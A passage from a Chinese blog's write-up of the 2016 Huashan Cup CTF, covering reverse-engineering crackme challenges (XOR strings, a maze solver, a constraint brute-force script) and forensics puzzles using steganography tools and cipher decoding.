<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">dword_40CF70</span> = <span class="number">1</span>;</div><div class="line"><span class="attr">dword_40CF74</span> = -<span class="number">1</span>;</div><div class="line"><span class="attr">dword_40CF78</span> = -<span class="number">2</span>;</div><div class="line"><span class="attr">v3</span> = lstrlenA(String);</div></pre></td></tr></table></figure>
<p>再看下面的if语句</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/085940%20"/></p>
<p>第一个if中的v3为String的长度，String为’rev3rs3_ana1ys1s’。里面是一个do…while语句，里面是一些if 语句，根据上面列出的赋值语句，直接到达下图的关键字串处理部分：</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/090001%20"/></p>
<p>现在逻辑就很清晰了<br/>字串与9异或，以16进制形式输出结果。用python计算结果如图</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/091048%20"/></p>
<h2 id="捉迷藏-150"><a class="headerlink" href="#捉迷藏-150" title="捉迷藏(150)"></a>捉迷藏(150)</h2><blockquote>
<p>捉迷藏。文件一定要保存好，不要像这个程序一样随便一diu~  PS：建议在win32环境下测试</p>
</blockquote>
<p>用IDA打开 能看到用户名</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/091338%20"/></p>
<p>密码随便输入14个1，发现14个1变为base64编码和另一串比<br/>下断点得到base64的编码，解码得到OnYourComputer</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/091519%20"/></p>
<p>sub_13D1D00内会把用户名+密码+ArvinShow存到<br/>系统临时目录/flag.jpg，flag即为</p>
<p><code>FindKeyOnYourComputerArvinShow</code></p>
<h2 id="移动迷宫-200"><a class="headerlink" href="#移动迷宫-200" title="移动迷宫(200)"></a>移动迷宫(200)</h2><blockquote>
<p>移动迷宫。当赶到的时候发现对方已经提前接头了，但在现场遗留了一个U盘并恢复出了一个登陆程序，如何才能拿到密钥？</p>
</blockquote>
<p>程序就是个简单的走迷宫<br/>输入的东西，进行各简单变化，对应于走的方向</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/092111%20"/></p>
<p>走的逻辑是</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/092202%20"/></p>
<p>根据坐标生成方向即可，逆代码如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">map_info = <span class="string">"***********####******#**#*****##*##********#*********#*#####***###***#*********#*********#********##"</span></div><div class="line">result = <span class="string">""</span></div><div class="line">x = <span class="number">0</span></div><div class="line">y = <span class="number">0</span></div><div class="line"></div><div class="line">pos_list = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(map_info)):</div><div class="line">	result += map_info[i]</div><div class="line"></div><div class="line">	y = (i)%<span class="number">10</span></div><div class="line">	x = i/<span class="number">10</span></div><div class="line">	<span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">10</span> == <span class="number">0</span>:</div><div class="line">		result += <span class="string">"\n"</span></div><div class="line">	<span class="keyword">if</span> map_info[i] == <span class="string">"#"</span>:</div><div class="line">		pos_list.append((x, y))</div><div class="line"></div><div class="line"><span class="keyword">print</span> map_info[<span class="number">0x28</span>]</div><div class="line"><span class="keyword">print</span> result</div><div class="line"><span class="keyword">print</span> pos_list</div><div class="line"></div><div class="line">last = <span class="number">0</span></div><div class="line"></div><div class="line">way_list = []</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line"></div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line"></div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</div><div class="line"></div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</div><div class="line"></div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</div><div class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</div><div class="line"></div><div class="line"><span class="keyword">print</span> len(way_list)</div><div class="line">map_dic = {}</div><div class="line">map_dic[(<span class="number">-1</span>, <span class="number">0</span>)] = <span class="number">3</span></div><div class="line">map_dic[(<span class="number">1</span>, <span class="number">0</span>)] = <span class="number">4</span></div><div class="line">map_dic[(<span class="number">0</span>, <span class="number">-1</span>)] = <span class="number">1</span></div><div class="line">map_dic[(<span class="number">0</span>, <span class="number">1</span>)] = <span class="number">2</span></div><div class="line"></div><div class="line">result = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> way_list:</div><div class="line">	result.append(map_dic[i])</div><div class="line"></div><div class="line"></div><div class="line">way_key = <span class="string">"""0A1B</span></div><div class="line">a2b3</div><div class="line">4C5D</div><div class="line">c6d7</div><div class="line">8E9F</div><div class="line">e0f1"""</div><div class="line"></div><div class="line">way_key = way_key.split(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> result</div><div class="line"><span class="keyword">print</span> len(result)</div><div class="line">result_info = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">		result_info += way_key[j][result[i*<span class="number">6</span>+j]<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> way_key</div><div class="line"><span class="keyword">print</span> result_info</div></pre></td></tr></table></figure>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/092554%20"/></p>
<h2 id="Do-something-200"><a class="headerlink" href="#Do-something-200" title="Do something(200)"></a>Do something(200)</h2><blockquote>
<p>Do something登录程序后收到了一张图片，这其中会有什么蹊跷？已更新，可以继续做题～binwalk从png中分离exe</p>
</blockquote>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">程序让输入用户名 符合一系列条件</div><div class="line"><span class="built_in">a1</span>=a9</div><div class="line"><span class="built_in">a1</span>=aa</div><div class="line"><span class="built_in">a2</span>=ab</div><div class="line"><span class="built_in">a3</span>=<span class="built_in">a5</span></div><div class="line"><span class="built_in">a4</span>=<span class="built_in">a6</span></div><div class="line">ac=<span class="number">5</span></div><div class="line">a8=<span class="number">3</span>*a <span class="number">24</span></div><div class="line">ad&gt;<span class="number">5</span>*a <span class="number">4</span>b</div><div class="line">ae=<span class="number">2</span>*a <span class="number">1</span>a</div><div class="line"><span class="built_in">a4</span>&gt;<span class="number">3</span>*a <span class="number">27</span></div><div class="line"><span class="built_in">a1</span>&gt;<span class="built_in">a4</span></div><div class="line"><span class="number">21</span>&gt;<span class="built_in">a1</span></div><div class="line"><span class="built_in">a1</span>=ad+<span class="built_in">a7</span></div><div class="line"><span class="built_in">a7</span>=<span class="number">2</span>*a <span class="number">20</span></div><div class="line"><span class="built_in">a3</span>&gt;<span class="number">4</span>*a <span class="number">3</span>c</div><div class="line"><span class="built_in">a7</span>&gt;<span class="built_in">a3</span></div><div class="line"><span class="built_in">a3</span>%<span class="number">3</span>=<span class="number">0</span></div><div class="line"><span class="built_in">a2</span>&gt;<span class="number">7</span></div><div class="line"><span class="built_in">a3</span>&gt;<span class="built_in">a2</span></div></pre></td></tr></table></figure>
<p>写给脚本跑一下<br/><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line">cnt = <span class="number">0</span></div><div class="line">a1=<span class="number">0</span></div><div class="line">a2=<span class="number">0</span></div><div class="line">a3=<span class="number">0</span></div><div class="line">a4=<span class="number">0</span></div><div class="line">a5=<span class="number">0</span></div><div class="line">a6=<span class="number">0</span></div><div class="line">a7=<span class="number">0</span></div><div class="line">a8=<span class="number">0</span></div><div class="line">a9=<span class="number">0</span></div><div class="line">a10=<span class="number">0</span></div><div class="line">a11=<span class="number">0</span></div><div class="line">a12=<span class="number">5</span></div><div class="line">a13=<span class="number">0</span></div><div class="line">a14=<span class="number">0</span></div><div class="line">a15=<span class="number">0</span></div><div class="line">a16=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</div><div class="line"> <span class="keyword">if</span> <span class="number">0x15</span>&lt;=a1:</div><div class="line">  <span class="keyword">continue</span></div><div class="line"> a9=a1</div><div class="line"> a10=a1</div><div class="line"> <span class="keyword">for</span> a2 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</div><div class="line">  a11=a2</div><div class="line">  <span class="keyword">if</span> a2&lt;=<span class="number">7</span>:</div><div class="line">   <span class="keyword">continue</span></div><div class="line">  <span class="keyword">for</span> a3 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</div><div class="line">   <span class="keyword">if</span> a3%<span class="number">3</span>!=<span class="number">0</span>:</div><div class="line">    <span class="keyword">continue</span></div><div class="line">   a5=a3</div><div class="line">   <span class="keyword">if</span> a3&lt;=a2:</div><div class="line">    <span class="keyword">continue</span></div><div class="line">   <span class="keyword">for</span> a4 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</div><div class="line">    a6=a4</div><div class="line">    <span class="keyword">if</span> a1&lt;=a4:</div><div class="line">     <span class="keyword">continue</span></div><div class="line">    <span class="keyword">for</span> a16 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</div><div class="line">     a7=<span class="number">2</span>*a16</div><div class="line">     <span class="keyword">if</span> a1&gt;=a7:</div><div class="line">      ad=a1-a7</div><div class="line">     <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">continue</span></div><div class="line">     <span class="keyword">if</span> a7&lt;=a3:</div><div class="line">      <span class="keyword">continue</span></div><div class="line">     a12=<span class="number">5</span></div><div class="line">     <span class="keyword">if</span> <span class="number">1</span>==<span class="number">1</span>:</div><div class="line">      a8=<span class="number">3</span>*a12</div><div class="line">      <span class="keyword">for</span> a13 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</div><div class="line">       a14=<span class="number">2</span>*a13</div><div class="line">       <span class="keyword">if</span> a4&lt;=<span class="number">3</span>*a13:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">       <span class="keyword">for</span> a15 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</div><div class="line">        <span class="keyword">if</span> a13&lt;=<span class="number">5</span>*a15:</div><div class="line">         <span class="keyword">continue</span></div><div class="line">        <span class="keyword">if</span> a3&lt;=<span class="number">4</span>*a15:</div><div class="line">         <span class="keyword">continue</span></div><div class="line">        <span class="keyword">print</span> chr(a1+<span class="number">96</span>)+chr(a2+<span class="number">96</span>)+chr(a3+<span class="number">96</span>)+chr(a4+<span class="number">96</span>)+chr(a5+<span class="number">96</span>)+chr(a6+<span class="number">96</span>)+chr(a7+<span class="number">96</span>)+chr(a8+<span class="number">96</span>)+chr(a9+<span class="number">96</span>)+chr(a10+<span class="number">96</span>)+chr(a11+<span class="number">96</span>)+chr(a12+<span class="number">96</span>)+chr(a13+<span class="number">96</span>)+chr(a14+<span class="number">96</span>)+chr(a15+<span class="number">96</span>)+chr(a16+<span class="number">96</span>)</div></pre></td></tr></table></figure></p>
<p>得到 </p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/093603%20"/></p>
<p>访问程序得到一个地址  访问地址  <strong><a href="http://reverse.***" rel="external" target="_blank">http://reverse.***</a></strong>.cn/galfehttonsisiht.php**<br/>就能得到flag了</p>
<h1 id="Forensics"><a class="headerlink" href="#Forensics" title="Forensics"></a>Forensics</h1><h2 id="蒲公英的约定"><a class="headerlink" href="#蒲公英的约定" title="蒲公英的约定"></a>蒲公英的约定</h2><blockquote>
<p>蒲公英的约定<br/>100<br/>题目描述？小学篱笆旁的 蒲公英~</p>
</blockquote>
<p>这个简单 使用stegsolve打开</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/094255%20"/></p>
<p>能看到一个二维码 </p>
<p>反转一下颜色 然后 扫描就得到一个类似base64字符串，但其实是base32字符串，用python的base64.b32decode即可得到flag</p>
<h2 id="什么鬼-100"><a class="headerlink" href="#什么鬼-100" title="什么鬼(100)"></a>什么鬼(100)</h2><blockquote>
<p>什么鬼</p>
</blockquote>
<p>你瞅啥？</p>
<p>binwal解压出一个压缩包</p>
<p>压缩包是有密码的  注释上写的4位数<br/>爆破  得到密码 19bZ<br/>打开压缩包是一个破损的二维码 PS一下就好了</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/094542%20"/></p>
<h2 id="客官，听点小曲儿？"><a class="headerlink" href="#客官，听点小曲儿？" title="客官，听点小曲儿？"></a>客官，听点小曲儿？</h2><p>这题的mp3地址不是直接提供的，而是提供了一个网站，留意网页的header，里面有key为cherrs，而mp3最常见的隐写术就是mp3Stego，找一个解密即可<br/><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Decode –X song<span class="selector-class">.mp3</span> –P cheers</div></pre></td></tr></table></figure></p>
<p>得到<br/><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">fdc3_</span><span class="selector-id">#l</span>{tsf<span class="selector-id">#ahfte</span>}<span class="attribute">gs</span>:en_hmgcX_poe`</div></pre></td></tr></table></figure></p>
<p>就会生成文件，文件里内容是经过不规则的栅栏加密过，只要自己手工按照flag形式去调整下即可。<br/><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">flag_Xd</span>{<span class="attribute">hSh_ctf</span>:mp3stego_fence##}</div></pre></td></tr></table></figure></p>
<h2 id="网红之路"><a class="headerlink" href="#网红之路" title="网红之路"></a>网红之路</h2><p>这个比赛之后才做出来的</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/095233%20"/></p>
<p>接着就是简单的编码问题了</p>
<h1 id="Finally"><a class="headerlink" href="#Finally" title="Finally"></a>Finally</h1><p>一个安卓都没做出来   好尴尬。。。。</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/99289129.jpg"/></p>
</div>
</div>
<div class="copyright">
<p><span>本文标题:</span><a href="/2016/09/11/2016-Hs-ctf-SeeSea-writeup/">2016-中国·西安 华山杯 Writeup-SeeSea</a></p>
<p><span>文章作者:</span><a href="/" title="访问 Swing|浮生若梦 的个人博客">Swing|浮生若梦</a></p>
<p><span>发布时间:</span>2016年09月11日 - 10时15分</p>
<p><span>最后更新:</span>2016年12月14日 - 23时57分</p>
<p>
<span>原始链接:</span><a class="post-url" href="/2016/09/11/2016-Hs-ctf-SeeSea-writeup/" title="2016-中国·西安 华山杯 Writeup-SeeSea">http://bestwing.me/2016/09/11/2016-Hs-ctf-SeeSea-writeup/</a>
<span class="copy-path" data-clipboard-text="原文: http://bestwing.me/2016/09/11/2016-Hs-ctf-SeeSea-writeup/　　作者: Swing|浮生若梦" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
<script src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/clipboard.min.js"></script>
<script> var clipboard = new Clipboard('.copy-path'); </script>
</p>
<p>
<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="license" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
</div>
<nav id="article-nav">
<a class="article-nav-link-wrap" href="/2016/09/18/tell_myself/" id="article-nav-newer">
<strong class="article-nav-caption">&lt;</strong>
<div class="article-nav-title">
        
          有时候想想 是得规划一下自己了
        
      </div>
</a>
<a class="article-nav-link-wrap" href="/2016/09/10/Common types of RSA/" id="article-nav-older">
<div class="article-nav-title">一大波RSA就要来了~~</div>
<strong class="article-nav-caption">&gt;</strong>
</a>
</nav>
<!-- -- ���Ӿ���ͼ�� ---->
<div class="post-donate">
<div class="donate_bar center" id="donate_board">
<a class="btn_donate" href="javascript:;" id="btn_donate" title="����"></a>
<span class="donate_txt">
           ↑<br/>
		   如果觉得文章对你有用，不妨赏一点小钱吧！
        </span>
<br/>
</div>
<div class="donate_bar center hidden" id="donate_guide">
<!-- ֧��������ͼ�� -->
<img alt="֧��������" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/zhifubao.jpg"/>
<!-- ΢�Ŵ���ͼ�� -->
<img alt="΢�Ŵ���" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/weixin.jpg"/>
</div>
<script type="text/javascript">
		document.getElementById('btn_donate').onclick = function(){
			$('#donate_board').addClass('hidden');
			$('#donate_guide').removeClass('hidden');
		}
	</script>
</div>
<!-- -- ���Ӿ���ͼ�� ---->
</article>
<div class="toc-article" id="toc">
<strong class="toc-title">文章目录</strong>
<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到-10"><span class="toc-number">1.1.</span> <span class="toc-text">签到(10)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打不过-50"><span class="toc-number">1.2.</span> <span class="toc-text">打不过~(50)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#系统管理-100"><span class="toc-number">1.3.</span> <span class="toc-text">系统管理(100)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单js-100"><span class="toc-number">1.4.</span> <span class="toc-text">简单js(100)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#弹弹弹！-150"><span class="toc-number">1.5.</span> <span class="toc-text">弹弹弹！(150)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#233-150"><span class="toc-number">1.6.</span> <span class="toc-text">233(150)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无间道-200"><span class="toc-number">1.7.</span> <span class="toc-text">无间道(200)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mory-try"><span class="toc-number">1.8.</span> <span class="toc-text">Mory try</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php很烦人-200"><span class="toc-number">1.9.</span> <span class="toc-text">php很烦人(200)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三秒钟记忆-300"><span class="toc-number">1.10.</span> <span class="toc-text">三秒钟记忆(300)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#疯狂的JS-300"><span class="toc-number">1.11.</span> <span class="toc-text">疯狂的JS(300)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#紧急报文"><span class="toc-number">2.1.</span> <span class="toc-text">紧急报文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-it-x-or-z"><span class="toc-number">2.2.</span> <span class="toc-text">is it x or z ?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分组加密检测-150"><span class="toc-number">2.3.</span> <span class="toc-text">分组加密检测(150)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复一下这份邀请函部分内容-200"><span class="toc-number">2.4.</span> <span class="toc-text">修复一下这份邀请函部分内容(200)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间决定一切-350"><span class="toc-number">2.5.</span> <span class="toc-text">时间决定一切(350)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#协议？认证？加密？-300"><span class="toc-number">2.6.</span> <span class="toc-text">协议？认证？加密？(300)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Try-Everything-200"><span class="toc-number">3.1.</span> <span class="toc-text">Try Everything(200)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#挣脱牢笼"><span class="toc-number">3.2.</span> <span class="toc-text">挣脱牢笼</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Waring-Up-100"><span class="toc-number">4.1.</span> <span class="toc-text">Waring Up(100)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#到手的钥匙-100"><span class="toc-number">4.2.</span> <span class="toc-text">到手的钥匙(100)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#忘记用户名-100"><span class="toc-number">4.3.</span> <span class="toc-text">忘记用户名(100)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Help-me-150"><span class="toc-number">4.4.</span> <span class="toc-text">Help me(150)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#捉迷藏-150"><span class="toc-number">4.5.</span> <span class="toc-text">捉迷藏(150)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#移动迷宫-200"><span class="toc-number">4.6.</span> <span class="toc-text">移动迷宫(200)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-something-200"><span class="toc-number">4.7.</span> <span class="toc-text">Do something(200)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">5.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#蒲公英的约定"><span class="toc-number">5.1.</span> <span class="toc-text">蒲公英的约定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#什么鬼-100"><span class="toc-number">5.2.</span> <span class="toc-text">什么鬼(100)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#客官，听点小曲儿？"><span class="toc-number">5.3.</span> <span class="toc-text">客官，听点小曲儿？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网红之路"><span class="toc-number">5.4.</span> <span class="toc-text">网红之路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Finally"><span class="toc-number">6.</span> <span class="toc-text">Finally</span></a></li></ol>
</div>
<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
<script src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>
<div class="share">
<div class="bdsharebuttonbox">
<a class="bds_more" data-cmd="more" href="#"></a>
<a class="bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
<a class="bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
<a class="bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
<a class="bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
<a class="bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
</div>
<script>
        window._bd_share_config={
            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
    </script>
</div>
<div class="bdsharebuttonbox">
<a class="fx fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
<a class="fx fa-weixin bds_weixin" data-cmd="weixin" href="#" title="分享到微信"></a>
<a class="fx fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享到QQ好友"></a>
<a class="fx fa-facebook-official bds_fbook" data-cmd="fbook" href="#" title="分享到Facebook"></a>
<a class="fx fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到Twitter"></a>
<a class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" href="#" title="分享到linkedin"></a>
<a class="fx fa-files-o bds_copy" data-cmd="copy" href="#" title="分享到复制网址"></a>
</div>
